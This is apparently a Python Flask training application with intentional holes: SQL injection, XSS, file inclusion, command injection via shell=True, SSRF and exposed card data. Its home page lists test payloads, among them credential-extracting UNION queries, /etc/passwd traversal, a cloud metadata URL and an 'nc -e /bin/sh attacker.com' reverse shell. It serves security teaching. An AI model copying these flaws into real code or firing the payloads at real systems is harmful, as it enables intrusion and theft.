#!/usr/bin/env python3

"""
Vulnerable Web Application - For Educational Purposes Only
This script creates a simple vulnerable web application to demonstrate exploitation techniques.
⚠️  NEVER run this on a production server!
"""

from flask import Flask, request, jsonify, render_template_string
import sqlite3
import os

app = Flask(__name__)

# Vulnerable database setup (for SQL injection demo)
def init_db():
    """Initialize the enhanced vulnerable database"""
    conn = sqlite3.connect('vulnerable.db')
    cursor = conn.cursor()
    
    # Check if tables exist, if not run the enhancement script
    cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='users'")
    if not cursor.fetchone():
        # Run the enhancement script if database is not set up
        import subprocess
        subprocess.run(['python', 'enhance_vulnerable_db.py'], check=True)
    
    conn.close()

# Vulnerable routes for demonstration

@app.route('/')
def index():
    """Main page with links to vulnerable endpoints"""
    return '''
    <h1>🔓 Enhanced Vulnerable Web Application (Educational)</h1>
    <p>⚠️ This application contains intentional vulnerabilities for educational purposes only!</p>
    <p>🎓 Use this for learning security testing and vulnerability assessment.</p>
    
    <h2>🎯 Basic Vulnerable Endpoints:</h2>
    <ul>
        <li><a href="/search?q=test">Search (XSS)</a></li>
        <li><a href="/user?id=1">User Profile (SQL Injection)</a></li>
        <li><a href="/include?file=test.txt">File Viewer (LFI)</a></li>
        <li><a href="/execute?cmd=ls">Command Executor (Command Injection)</a></li>
        <li><a href="/fetch?url=http://example.com">URL Fetcher (SSRF)</a></li>
    </ul>
    
    <h2>🔥 Advanced Vulnerable Endpoints (Enhanced Database):</h2>
    <ul>
        <li><a href="/api/products?category=Electronics">Products Search (SQL Injection)</a></li>
        <li><a href="/api/orders?user_id=1&status=pending">Order History (SQL Injection)</a></li>
        <li><a href="/api/profile?id=1">User Profile (Information Disclosure)</a></li>
        <li><a href="/api/creditcard?user_id=1">Credit Card Lookup (Data Exposure)</a></li>
        <li><a href="/api/search?user_id=1&query=laptop">Search History (SQL Injection)</a></li>
        <li><a href="/api/admin/logs?admin_id=1&action=user">Admin Logs (Access Control Bypass)</a></li>
        <li><a href="/api/headers">Header Injection Test</a></li>
    </ul>
    
    <h3>🧪 Test Payloads for SQL Injection:</h3>
    <ul>
        <li><strong>Basic Union:</strong> <code>?id=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12--</code></li>
        <li><strong>Database Version:</strong> <code>?id=1 UNION SELECT 1,sqlite_version(),3,4,5,6,7,8,9,10,11,12--</code></li>
        <li><strong>Table Names:</strong> <code>?id=1 UNION SELECT 1,name,3,4,5,6,7,8,9,10,11,12 FROM sqlite_master WHERE type='table'--</code></li>
        <li><strong>Column Names:</strong> <code>?id=1 UNION SELECT 1,sql,3,4,5,6,7,8,9,10,11,12 FROM sqlite_master WHERE type='table' AND name='users'--</code></li>
        <li><strong>Data Extraction:</strong> <code>?id=1 UNION SELECT 1,username||':'||password,3,4,5,6,7,8,9,10,11,12 FROM users--</code></li>
    </ul>
    
    <h3>🎨 Test Payloads for XSS:</h3>
    <ul>
        <li><strong>Basic Alert:</strong> <code>?q=&lt;script&gt;alert('XSS')&lt;/script&gt;</code></li>
        <li><strong>Image with Error:</strong> <code>?q=&lt;img src=x onerror=alert('XSS')&gt;</code></li>
        <li><strong>SVG Payload:</strong> <code>?q=&lt;svg onload=alert('XSS')&gt;</code></li>
        <li><strong>Script Injection:</strong> <code>?q=&lt;script&gt;document.body.innerHTML='&lt;h1&gt;Hacked!&lt;/h1&gt;'&lt;/script&gt;</code></li>
    </ul>
    
    <h3>📁 Test Payloads for LFI:</h3>
    <ul>
        <li><strong>Basic Traversal:</strong> <code>?file=../../../../etc/passwd</code></li>
        <li><strong>Windows Path:</strong> <code>?file=..\..\..\..\windows\system32\drivers\etc\hosts</code></li>
        <li><strong>PHP Filter:</strong> <code>?file=php://filter/convert.base64-encode/resource=vulnerable_app.py</code></li>
        <li><strong>Data Wrapper:</strong> <code>?file=data://text/plain,Hello World!</code></li>
    </ul>
    
    <h3>⚡ Test Payloads for Command Injection:</h3>
    <ul>
        <li><strong>Basic Command:</strong> <code>?cmd=id; whoami</code></li>
        <li><strong>Chain Commands:</strong> <code>?cmd=ls && pwd && uname -a</code></li>
        <li><strong>Reverse Shell:</strong> <code>?cmd=nc -e /bin/sh attacker.com 4444</code></li>
        <li><strong>File Read:</strong> <code>?cmd=cat /etc/passwd</code></li>
    </ul>
    
    <h3>🌐 Test Payloads for SSRF:</h3>
    <ul>
        <li><strong>Internal Service:</strong> <code>?url=http://localhost:80</code></li>
        <li><strong>Metadata Service:</strong> <code>?url=http://169.254.169.254/latest/meta-data/</code></li>
        <li><strong>File Protocol:</strong> <code>?url=file:///etc/passwd</code></li>
        <li><strong>Gopher Protocol:</strong> <code>?url=gopher://localhost:22</code></li>
    </ul>
    
    <hr>
    <p><strong>🔒 Remember:</strong> This is for educational purposes only. Always practice responsible disclosure and never test systems you don't own or have permission to test.</p>
    '''

# 1. SQL Injection Vulnerability
@app.route('/user')
def get_user():
    """Vulnerable SQL injection endpoint"""
    user_id = request.args.get('id', '1')
    
    conn = sqlite3.connect('vulnerable.db')
    cursor = conn.cursor()
    
    # VULNERABLE: Direct string concatenation in SQL query
    query = f"SELECT * FROM users WHERE id = {user_id}"
    
    try:
        cursor.execute(query)
        user = cursor.fetchone()
        
        if user:
            return jsonify({
                'id': user[0],
                'username': user[1],
                'password': user[2],
                'email': user[3]
            })
        else:
            return jsonify({'error': 'User not found'})
            
    except sqlite3.Error as e:
        # This reveals SQL errors - also vulnerable!
        return jsonify({'error': str(e), 'query': query})
    
    conn.close()

# 2. XSS Vulnerability
@app.route('/search')
def search():
    """Vulnerable XSS endpoint"""
    query = request.args.get('q', '')
    
    # VULNERABLE: Direct user input in HTML without sanitization
    return f'''
    <h1>Search Results</h1>
    <p>You searched for: <strong>{query}</strong></p>
    <p>Results for "{query}": No results found.</p>
    <p><a href="/">Back to home</a></p>
    '''

# 3. Local File Inclusion (LFI) Vulnerability
@app.route('/include')
def include_file():
    """Vulnerable LFI endpoint"""
    filename = request.args.get('file', 'test.txt')
    
    # VULNERABLE: No path traversal protection
    try:
        with open(filename, 'r') as f:
            content = f.read()
        
        return f'''
        <h1>File Content</h1>
        <pre>{content}</pre>
        <p><a href="/">Back to home</a></p>
        '''
        
    except FileNotFoundError:
        return f'''
        <h1>File Not Found</h1>
        <p>Could not find file: {filename}</p>
        <p><a href="/">Back to home</a></p>
        '''

# 4. Command Injection Vulnerability
@app.route('/execute')
def execute_command():
    """Vulnerable command injection endpoint"""
    cmd = request.args.get('cmd', 'ls')
    
    # VULNERABLE: Direct command execution
    import subprocess
    try:
        result = subprocess.check_output(cmd, shell=True, text=True)
        
        return f'''
        <h1>Command Execution Result</h1>
        <pre>Command: {cmd}</pre>
        <pre>Output: {result}</pre>
        <p><a href="/">Back to home</a></p>
        '''
        
    except subprocess.CalledProcessError as e:
        return f'''
        <h1>Command Failed</h1>
        <p>Command: {cmd}</p>
        <p>Error: {str(e)}</p>
        <p><a href="/">Back to home</a></p>
        '''

# 5. Server-Side Request Forgery (SSRF) Vulnerability
@app.route('/fetch')
def fetch_url():
    """Vulnerable SSRF endpoint"""
    url = request.args.get('url', 'http://example.com')
    
    # VULNERABLE: No URL validation or restrictions
    try:
        import requests
        response = requests.get(url, timeout=5)
        
        return f'''
        <h1>URL Fetch Result</h1>
        <p>URL: {url}</p>
        <p>Status Code: {response.status_code}</p>
        <p>Response Headers: {dict(response.headers)}</p>
        <pre>Response Body: {response.text[:500]}...</pre>
        <p><a href="/">Back to home</a></p>
        '''
        
    except Exception as e:
        return f'''
        <h1>Fetch Failed</h1>
        <p>URL: {url}</p>
        <p>Error: {str(e)}</p>
        <p><a href="/">Back to home</a></p>
        '''

# 6. Additional vulnerable endpoint for header injection
@app.route('/api/headers')
def api_headers():
    """Vulnerable to header injection"""
    custom_header = request.headers.get('X-Custom-Header', 'default')
    
    # VULNERABLE: Direct header content in response
    return jsonify({
        'received_header': custom_header,
        'message': f'Received header: {custom_header}'
    })

# 7. Enhanced SQL injection with multiple tables
@app.route('/api/products')
def get_products():
    """Enhanced SQL injection with products table"""
    category = request.args.get('category', 'Electronics')
    price_min = request.args.get('price_min', '0')
    price_max = request.args.get('price_max', '999999')
    
    conn = sqlite3.connect('vulnerable.db')
    cursor = conn.cursor()
    
    # VULNERABLE: Direct string concatenation in SQL query
    query = f"""
        SELECT * FROM products 
        WHERE category = '{category}' 
        AND price BETWEEN {price_min} AND {price_max}
        ORDER BY price
    """
    
    try:
        cursor.execute(query)
        products = cursor.fetchall()
        
        result = []
        for product in products:
            result.append({
                'id': product[0],
                'name': product[1],
                'description': product[2],
                'price': product[3],
                'category': product[4],
                'stock': product[5]
            })
        
        return jsonify({
            'products': result,
            'query': query,  # VULNERABLE: Exposing the query
            'count': len(result)
        })
        
    except sqlite3.Error as e:
        return jsonify({
            'error': str(e),
            'query': query  # VULNERABLE: Exposing the query and error
        })
    
    conn.close()

# 8. Order search with SQL injection
@app.route('/api/orders')
def get_orders():
    """Order search with SQL injection"""
    user_id = request.args.get('user_id', '1')
    status = request.args.get('status', 'pending')
    
    conn = sqlite3.connect('vulnerable.db')
    cursor = conn.cursor()
    
    # VULNERABLE: Direct string concatenation
    query = f"""
        SELECT o.*, u.username, p.name as product_name 
        FROM orders o 
        JOIN users u ON o.user_id = u.id 
        JOIN products p ON o.product_id = p.id 
        WHERE o.user_id = {user_id} AND o.status = '{status}'
        ORDER BY o.order_date DESC
    """
    
    try:
        cursor.execute(query)
        orders = cursor.fetchall()
        
        result = []
        for order in orders:
            result.append({
                'order_id': order[0],
                'user_id': order[1],
                'product_id': order[2],
                'quantity': order[3],
                'total_price': order[4],
                'shipping_address': order[5],
                'credit_card_last4': order[6],  # VULNERABLE: Exposing partial card data
                'order_date': order[7],
                'status': order[8],
                'username': order[9],
                'product_name': order[10]
            })
        
        return jsonify({
            'orders': result,
            'query': query,  # VULNERABLE: Exposing the query
            'count': len(result)
        })
        
    except sqlite3.Error as e:
        return jsonify({
            'error': str(e),
            'query': query  # VULNERABLE: Exposing the query and error
        })
    
    conn.close()

# 9. User profile with information disclosure
@app.route('/api/profile')
def get_profile():
    """User profile with information disclosure"""
    user_id = request.args.get('id', '1')
    
    conn = sqlite3.connect('vulnerable.db')
    cursor = conn.cursor()
    
    # VULNERABLE: Direct concatenation
    query = f"""
        SELECT u.*, up.* 
        FROM users u 
        LEFT JOIN user_profiles up ON u.id = up.user_id 
        WHERE u.id = {user_id}
    """
    
    try:
        cursor.execute(query)
        user_data = cursor.fetchone()
        
        if user_data:
            return jsonify({
                'user': {
                    'id': user_data[0],
                    'username': user_data[1],
                    'email': user_data[3],
                    'role': user_data[4],
                    'created_at': user_data[5],
                    'full_name': user_data[12],
                    'date_of_birth': user_data[13],
                    'phone_number': user_data[14],
                    'address': user_data[15],
                    'security_question': user_data[20],  # VULNERABLE: Exposing security questions
                    'profile_picture': user_data[22]
                },
                'query': query  # VULNERABLE: Exposing the query
            })
        else:
            return jsonify({'error': 'User not found', 'query': query})
            
    except sqlite3.Error as e:
        return jsonify({
            'error': str(e),
            'query': query  # VULNERABLE: Exposing the query and error
        })
    
    conn.close()

# 10. Credit card lookup (simulated)
@app.route('/api/creditcard')
def get_credit_card():
    """Credit card lookup (simulated data)"""
    user_id = request.args.get('user_id', '1')
    
    conn = sqlite3.connect('vulnerable.db')
    cursor = conn.cursor()
    
    # VULNERABLE: Direct concatenation
    query = f"SELECT * FROM credit_cards WHERE user_id = {user_id} AND is_active = 1"
    
    try:
        cursor.execute(query)
        cards = cursor.fetchall()
        
        result = []
        for card in cards:
            result.append({
                'id': card[0],
                'user_id': card[1],
                'card_number': card[2],  # VULNERABLE: Exposing full card numbers
                'card_holder': card[3],
                'expiry': f"{card[4]}/{card[5]}",
                'cvv': card[6],  # VULNERABLE: Exposing CVV
                'billing_address': card[7],
                'is_active': card[8]
            })
        
        return jsonify({
            'credit_cards': result,
            'query': query,  # VULNERABLE: Exposing the query
            'count': len(result)
        })
        
    except sqlite3.Error as e:
        return jsonify({
            'error': str(e),
            'query': query  # VULNERABLE: Exposing the query and error
        })
    
    conn.close()

# 11. Search history with injection
@app.route('/api/search')
def get_search_history():
    """Search history with SQL injection"""
    user_id = request.args.get('user_id', '1')
    query_param = request.args.get('query', '')
    
    conn = sqlite3.connect('vulnerable.db')
    cursor = conn.cursor()
    
    # VULNERABLE: Multiple injection points
    query = f"""
        SELECT * FROM search_history 
        WHERE user_id = {user_id} 
        AND search_query LIKE '%{query_param}%'
        ORDER BY search_time DESC
    """
    
    try:
        cursor.execute(query)
        searches = cursor.fetchall()
        
        result = []
        for search in searches:
            result.append({
                'id': search[0],
                'user_id': search[1],
                'search_query': search[2],
                'search_time': search[3],
                'results_count': search[4]
            })
        
        return jsonify({
            'search_history': result,
            'query': query,  # VULNERABLE: Exposing the query
            'count': len(result)
        })
        
    except sqlite3.Error as e:
        return jsonify({
            'error': str(e),
            'query': query  # VULNERABLE: Exposing the query and error
        })
    
    conn.close()

# 12. Admin logs with access control bypass
@app.route('/api/admin/logs')
def get_admin_logs():
    """Admin logs with potential access control bypass"""
    admin_id = request.args.get('admin_id', '1')
    action = request.args.get('action', '')
    
    conn = sqlite3.connect('vulnerable.db')
    cursor = conn.cursor()
    
    # VULNERABLE: No proper access control check
    query = f"""
        SELECT al.*, u.username as admin_name 
        FROM admin_logs al 
        JOIN users u ON al.admin_id = u.id 
        WHERE al.admin_id = {admin_id} 
        AND al.action LIKE '%{action}%'
        ORDER BY al.timestamp DESC
    """
    
    try:
        cursor.execute(query)
        logs = cursor.fetchall()
        
        result = []
        for log in logs:
            result.append({
                'log_id': log[0],
                'admin_id': log[1],
                'action': log[2],
                'target_user_id': log[3],
                'details': log[4],
                'ip_address': log[5],
                'timestamp': log[6],
                'admin_name': log[7]
            })
        
        return jsonify({
            'admin_logs': result,
            'query': query,  # VULNERABLE: Exposing the query
            'count': len(result),
            'access_granted': True  # VULNERABLE: Always granting access
        })
        
    except sqlite3.Error as e:
        return jsonify({
            'error': str(e),
            'query': query  # VULNERABLE: Exposing the query and error
        })
    
    conn.close()

if __name__ == '__main__':
    import argparse
    
    parser = argparse.ArgumentParser(description='Vulnerable Web Application for Educational Purposes')
    parser.add_argument('--port', type=int, default=5000, help='Port to run the application on')
    args = parser.parse_args()
    
    print(f"🚨 Starting Vulnerable Web Application for Educational Purposes on port {args.port}!")
    print("⚠️  WARNING: This application contains intentional vulnerabilities!")
    print("🔒 Only run this in a controlled, isolated environment!")
    print("\n📋 Available vulnerable endpoints:")
    print("  • /user?id=1 (SQL Injection)")
    print("  • /search?q=test (XSS)")
    print("  • /include?file=test.txt (LFI)")
    print("  • /execute?cmd=ls (Command Injection)")
    print("  • /fetch?url=http://example.com (SSRF)")
    print(f"\n🌐 Starting server on http://127.0.0.1:{args.port}")
    
    init_db()
    app.run(host='127.0.0.1', port=args.port, debug=True)